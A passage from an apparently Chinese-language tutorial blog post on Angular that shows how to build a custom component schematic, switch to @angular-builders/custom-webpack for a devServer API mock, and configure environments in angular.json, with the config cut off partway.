  <span class="token string">&quot;schematics&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token string">&quot;my-component&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;Create a  component&quot;</span><span class="token punctuation">,</span>
      <span class="token string">&quot;factory&quot;</span><span class="token operator">:</span> <span class="token string">&quot;./my-component/index&quot;</span><span class="token punctuation">,</span>
      <span class="token string">&quot;schema&quot;</span><span class="token operator">:</span> <span class="token string">&quot;./my-component/schema.json&quot;</span><span class="token punctuation">,</span>
      <span class="token string">&quot;aliases&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">&quot;mc&quot;</span><span class="token punctuation">]</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><ol start="2"><li>schema.json
该文件用于定义输入项 (比如 --name)，以及一些参数的默认值。</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span>
  <span class="token string">&quot;$schema&quot;</span><span class="token operator">:</span> <span class="token string">&quot;http://json-schema.org/schema&quot;</span><span class="token punctuation">,</span>
  <span class="token string">&quot;id&quot;</span><span class="token operator">:</span> <span class="token string">&quot;MyComponent&quot;</span><span class="token punctuation">,</span>
  <span class="token string">&quot;title&quot;</span><span class="token operator">:</span> <span class="token string">&quot;My Component Options Schema&quot;</span><span class="token punctuation">,</span>
  <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;object&quot;</span><span class="token punctuation">,</span>
  <span class="token string">&quot;properties&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token string">&quot;name&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;string&quot;</span><span class="token punctuation">,</span>
      <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;The name of the component.&quot;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token string">&quot;prefix&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;string&quot;</span><span class="token punctuation">,</span>
      <span class="token string">&quot;format&quot;</span><span class="token operator">:</span> <span class="token string">&quot;html-selector&quot;</span><span class="token punctuation">,</span>
      <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;The prefix to apply to generated selectors.&quot;</span><span class="token punctuation">,</span>
      <span class="token string">&quot;alias&quot;</span><span class="token operator">:</span> <span class="token string">&quot;p&quot;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token string">&quot;styleext&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;The file extension to be used for style files.&quot;</span><span class="token punctuation">,</span>
      <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;string&quot;</span><span class="token punctuation">,</span>
      <span class="token string">&quot;default&quot;</span><span class="token operator">:</span> <span class="token string">&quot;css&quot;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token string">&quot;spec&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;boolean&quot;</span><span class="token punctuation">,</span>
      <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;Specifies if a spec file is generated.&quot;</span><span class="token punctuation">,</span>
      <span class="token string">&quot;default&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token string">&quot;flat&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;boolean&quot;</span><span class="token punctuation">,</span>
      <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;Flag to indicate if a dir is created.&quot;</span><span class="token punctuation">,</span>
      <span class="token string">&quot;default&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token string">&quot;selector&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;string&quot;</span><span class="token punctuation">,</span>
      <span class="token string">&quot;format&quot;</span><span class="token operator">:</span> <span class="token string">&quot;html-selector&quot;</span><span class="token punctuation">,</span>
      <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;The selector to use for the component.&quot;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token string">&quot;required&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token string">&quot;name&quot;</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br></div></div><ol start="3"><li>tsconfig.json
TyleScript 的编译配置。</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span>
  <span class="token string">&quot;compilerOptions&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token string">&quot;baseUrl&quot;</span><span class="token operator">:</span> <span class="token string">&quot;tsconfig&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;lib&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token string">&quot;es2017&quot;</span><span class="token punctuation">,</span>
      <span class="token string">&quot;dom&quot;</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token string">&quot;module&quot;</span><span class="token operator">:</span> <span class="token string">&quot;commonjs&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;moduleResolution&quot;</span><span class="token operator">:</span> <span class="token string">&quot;node&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;noEmitOnError&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
    <span class="token string">&quot;skipDefaultLibCheck&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    <span class="token string">&quot;skipLibCheck&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    <span class="token string">&quot;sourceMap&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    <span class="token string">&quot;target&quot;</span><span class="token operator">:</span> <span class="token string">&quot;es6&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;types&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token string">&quot;jasmine&quot;</span><span class="token punctuation">,</span>
      <span class="token string">&quot;node&quot;</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token string">&quot;include&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token string">&quot;src/**/*&quot;</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token string">&quot;exclude&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token string">&quot;src/**/*/files/**/*&quot;</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><ol start="4"><li>index.ts
这里的 buildComponent 是官方包 utils 中包含的，但是还没有单独发布，这里是直接拷贝出来的。</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> chain<span class="token punctuation">,</span> Rule <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular-devkit/schematics'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Schema <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./schema'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> buildComponent <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../utils/devkit-utils/component'</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">options<span class="token operator">:</span> Schema</span><span class="token punctuation">)</span><span class="token operator">:</span> Rule <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token function">chain</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
    <span class="token function">buildComponent</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token operator">...</span>options <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><ol start="5"><li>schema.ts
输入项的 interface，这里直接 extends Angular 组件的 interface。</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span>Schema <span class="token keyword">as</span> ComponentSchema<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@schematics/angular/component/schema'</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">Schema</span> <span class="token keyword">extends</span> <span class="token class-name">ComponentSchema</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ol start="6"><li>模版文件
下面几个文件奇怪的路径、文件名、以及内容将会被 <code>@angular-devkit/schematics 的 template&lt;T&gt;(options: T)</code> 方法解析，将参数应用到模版内容及路径。如果你愿意的话你也可以直接实现一个模板系统。</li></ol> <ul><li><strong>name@dasherize</strong>.component.ts</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>

@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'&lt;%= selector %&gt;'</span><span class="token punctuation">,</span>
  templateUrl<span class="token operator">:</span> <span class="token string">'./&lt;%= dasherize(name) %&gt;.component.html'</span><span class="token punctuation">,</span>
  styleUrls<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'./&lt;%= dasherize(name) %&gt;.component.&lt;%= styleext %&gt;'</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token operator">&lt;</span><span class="token operator">%=</span> <span class="token function">classify</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">&gt;</span>Component <span class="token punctuation">{</span>

<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><ul><li><strong>name@dasherize</strong>.component.html</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>h2<span class="token operator">&gt;</span>My Component<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ul><li><strong>name@dasherize</strong>.component.<strong>styleext</strong></li></ul> <div class="language- line-numbers-mode"><pre class="language-text"><code>h2 {
 color: red;
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li><strong>name@dasherize</strong>.component.spec.ts</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> fakeAsync<span class="token punctuation">,</span> ComponentFixture<span class="token punctuation">,</span> TestBed <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core/testing'</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token punctuation">{</span> <span class="token operator">&lt;</span><span class="token operator">%=</span> <span class="token function">classify</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">&gt;</span>Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./&lt;%= dasherize(name) %&gt;.component'</span><span class="token punctuation">;</span>

<span class="token function">describe</span><span class="token punctuation">(</span><span class="token string">'&lt;%= classify(name) %&gt;Component'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> component<span class="token operator">:</span> <span class="token operator">&lt;</span><span class="token operator">%=</span> <span class="token function">classify</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">&gt;</span>Component<span class="token punctuation">;</span>
  <span class="token keyword">let</span> fixture<span class="token operator">:</span> ComponentFixture<span class="token operator">&lt;&lt;</span><span class="token operator">%=</span> <span class="token function">classify</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">&gt;</span>Component<span class="token operator">&gt;</span><span class="token punctuation">;</span>

  <span class="token function">beforeEach</span><span class="token punctuation">(</span><span class="token function">fakeAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    TestBed<span class="token punctuation">.</span><span class="token function">configureTestingModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      declarations<span class="token operator">:</span> <span class="token punctuation">[</span> <span class="token operator">&lt;</span><span class="token operator">%=</span> <span class="token function">classify</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">&gt;</span>Component <span class="token punctuation">]</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">compileComponents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    fixture <span class="token operator">=</span> TestBed<span class="token punctuation">.</span><span class="token function">createComponent</span><span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token operator">%=</span> <span class="token function">classify</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">&gt;</span>Component<span class="token punctuation">)</span><span class="token punctuation">;</span>
    component <span class="token operator">=</span> fixture<span class="token punctuation">.</span>componentInstance<span class="token punctuation">;</span>
    fixtjsure<span class="token punctuation">.</span><span class="token function">detectChanges</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">it</span><span class="token punctuation">(</span><span class="token string">'should compile'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token function">expect</span><span class="token punctuation">(</span>component<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toBeTruthy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>修改完成后我们进行下一步。</p> <h4 id="编译运行"><a href="#编译运行" class="header-anchor">#</a> 编译运行</h4> <p>现在运行 npm run build 编译我们的 schematics。然后切换到 Angular 项目中试一试下面的命令:</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>ng g my<span class="token operator">-</span>schematics<span class="token operator">:</span>mc <span class="token operator">--</span>prefix app <span class="token operator">--</span>styleext less <span class="token operator">--</span>name test<span class="token operator">-</span>component
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>不出意外的话你因该可以在控制台看到这样的信息。</p> <p><img src="/vuebloger/img/post/v2-7e7a402bd721554ebdcf8bc04e980576_720w.jpg" alt=""></p> <p>下面是我们传入的几个参数，它们在 schema.json 中被定义。</p> <ul><li>styleext 参数为样式文件的扩展名</li> <li>prefix 参数为组件 selector 的前缀</li> <li>name 参数定义组件名</li></ul> <p>之后我们就可以在此基础上定义一些布如局、表格、表单等常见的义务组合组件或者服务。下面是一些其他库 ng add 的 Schematics：</p> <ul><li><a href="https://github.com/ng-alain/ng-alain" target="_blank" rel="noopener noreferrer">ng-alain<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li> <li>material2</li> <li>ng-bootstrap</li></ul> <h2 id="弹出webpack"><a href="#弹出webpack" class="header-anchor">#</a> 弹出webpack</h2> <p>angular使用默认渲染引擎是<code>@angular-devkit/build-angular:browser</code>,angular.json没有提供明显的配置静态文件分级的配置，默认angular打包只有一层目录。我们可以更换渲染引擎为<a href="https://www.npmjs.com/package/@angular-builders/custom-webpack" target="_blank" rel="noopener noreferrer">@angular-builders/custom-webpack<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>来弹出webpack.config.js进行更自由的配置,比如开启gzip，使用dotenv-webpack区分开发环境，配置文件分级和contentBase本地文件托管等等。</p> <p><img src="/vuebloger/img/post/Snipaste_2021-04-10_17-47-34.png" alt=""></p> <ol><li>准备好自定义 webpack 配置
新建webpack.config.js项目目录下。比如我想要使用 devServer.before 来处理 api mock，自定义 webpack 配置如下：</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>
  devServer<span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token function-variable function">before</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">app</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/some/path'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> custom<span class="token operator">:</span> <span class="token string">'response'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>2.安装 @angular-builders/custom-webpack 依赖</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>npm i -D @angular-builders/custom-webpack
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ol start="3"><li>修改 angular.json</li></ol> <p>将对应的 builder 修改为 @angular-builders/custom-webpack。如下，在 serve 中修改：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token string">&quot;builder&quot;</span><span class="token operator">:</span> <span class="token string">&quot;@angular-builders/custom-webpack:dev-server&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>在其他 <code>[architect-target]</code> 中同理，然后在 options 中增加 customWebpackConfig：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token string">&quot;customWebpackConfig&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
  <span class="token string">&quot;path&quot;</span><span class="token operator">:</span> <span class="token string">&quot;./extra-webpack.config.js&quot;</span><span class="token punctuation">,</span>
  <span class="token string">&quot;mergeStrategies&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string">&quot;loaders&quot;</span><span class="token operator">:</span> <span class="token string">&quot;append&quot;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>这样，自定义 webpack 配置就生效了。我们可以通过 ng serve 启动项目，看一下模拟接口 /some/path 是否已经生效。</p> <h2 id="环境变量注入"><a href="#环境变量注入" class="header-anchor">#</a> 环境变量注入</h2> <p>angular默认是使用environment文件通过不同打包模式替换的方式实现环境变量切换，在angular.json中配置：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span>
  <span class="token string">&quot;$schema&quot;</span><span class="token operator">:</span> <span class="token string">&quot;./node_modules/@angular/cli/lib/config/schema.json&quot;</span><span class="token punctuation">,</span>
  <span class="token string">&quot;version&quot;</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token comment">// 指明了Angular 工作空间 概要的版本。</span>
  <span class="token string">&quot;newProjectRoot&quot;</span><span class="token operator">:</span> <span class="token string">&quot;projects&quot;</span><span class="token punctuation">,</span>
  <span class="token string">&quot;projects&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token string">&quot;ky-scholar-web&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string">&quot;projectType&quot;</span><span class="token operator">:</span> <span class="token string">&quot;application&quot;</span><span class="token punctuation">,</span>
      <span class="token string">&quot;schematics&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>   <span class="token comment">// schematics包配置</span>
        <span class="token string">&quot;@schematics/angular:component&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
          <span class="token string">&quot;style&quot;</span><span class="token operator">:</span> <span class="token string">&quot;less&quot;</span> <span class="token comment">// 修改cli生成默认为less</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">&quot;root&quot;</span><span class="token operator">:</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token comment">// 单应用默认为空</span>
      <span class="token string">&quot;sourceRoot&quot;</span><span class="token operator">:</span> <span class="token string">&quot;src&quot;</span><span class="token punctuation">,</span>
      <span class="token string">&quot;prefix&quot;</span><span class="token operator">:</span> <span class="token string">&quot;app&quot;</span><span class="token punctuation">,</span> <span class="token comment">// 组件创建标签前缀</span>
      <span class="token string">&quot;architect&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;build&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
          <span class="token string">&quot;builder&quot;</span><span class="token operator">:</span> <span class="token string">&quot;@angular-builders/custom-webpack:browser&quot;</span><span class="token punctuation">,</span>
          <span class="token string">&quot;options&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;customWebpackConfig&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
              <span class="token string">&quot;path&quot;</span><span class="token operator">:</span> <span class="token string">&quot;./webpack.config.js&quot;</span> <span class="token comment">// 暴露webpack</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token string">&quot;outputPath&quot;</span><span class="token operator">:</span> <span class="token string">&quot;dist/ky-scholar-web&quot;</span><span class="token punctuation">,</span> <span class="token comment">// 输出目录</span>
            <span class="token string">&quot;index&quot;</span><span class="token operator">:</span> <span class="token string">&quot;src/index.html&quot;</span><span class="token punctuation">,</span> <span class="token comment">// 首页模板</span>
            <span class="token string">&quot;main&quot;</span><span class="token operator">:</span> <span class="token string">&quot;src/main.ts&quot;</span><span class="token punctuation">,</span> <span class="token comment">// 入口</span>
            <span class="token string">&quot;polyfills&quot;</span><span class="token operator">:</span> <span class="token string">&quot;src/polyfills.ts&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;tsConfig&quot;</span><span class="token operator">:</span> <span class="token string">&quot;tsconfig.app.json&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;aot&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token string">&quot;stylePreprocessorOptions&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">// 添加样式全局路径变量，比如在...core/less下的mixin.less在组件less中直接@import 'mixin';即可</span>
              <span class="token string">&quot;includePaths&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
                <span class="token string">&quot;./src/style/&quot;</span><span class="token punctuation">,</span>
                <span class="token string">&quot;node_modules/&quot;</span><span class="token punctuation">,</span>
                <span class="token string">&quot;./core/less/&quot;</span>
              <span class="token punctuation">]</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token string">&quot;assets&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span> <span class="token comment">// 直接拷贝的静态资源，默认是拷贝到构架目录assets</span>
              <span class="token string">&quot;src/favicon.ico&quot;</span><span class="token punctuation">,</span>
              <span class="token string">&quot;src/assets/images&quot;</span><span class="token punctuation">,</span>
              <span class="token punctuation">{</span>
                <span class="token string">&quot;glob&quot;</span><span class="token operator">:</span> <span class="token string">&quot;**/*&quot;</span><span class="token punctuation">,</span> <span class="token comment">//使用glob正则匹配inline-svg/下的文件拷贝到/assets/下</span>
